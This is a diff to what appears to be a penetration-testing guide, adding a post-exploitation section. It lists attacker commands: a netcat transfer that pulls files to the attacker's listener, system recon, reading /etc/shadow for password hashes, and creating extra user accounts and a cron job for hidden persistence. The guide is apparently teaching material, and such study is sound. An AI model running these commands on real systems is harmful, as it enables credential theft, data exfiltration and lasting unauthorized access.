@@ -62,8 +62,17 @@ When presenting these examples I will be going through these steps
 
 
 ## Post-Exploitation Examples:
-- After gaining access to the remote system and starting a shell session, the user can manually use netcat to search for a specified file. Here is an example:
+- Example of an attacker retrieving files from the remote machine
   - Open a terminal on the local host and run "nc -lnvp [portnum] > [file for info to be stored]"
   - On the remote machine (the breached machine) run the command " [IP of local machine] [portnum] < [file path to be retrieved]
+- Example of an attacker doing further recon on the system (can help them discover more vulnerabilities by knowing the system specs)
+  - uname -a
+  - lsb_release
+- Example of how an attacker can easily obtain passwords etc
+  - cat /etc/shadow (or by directly downloading the file to their local machine)
+- Example of an attacker maintaining access (create multiple accounts to blend in)
+  - sudo useradd -m -s /bin/bash newuser
+  - sudo passwd newuser
+  - Creating a cron job to allow access back to the machine during certain times to avoid being detected
 
 # Guide To Testing:
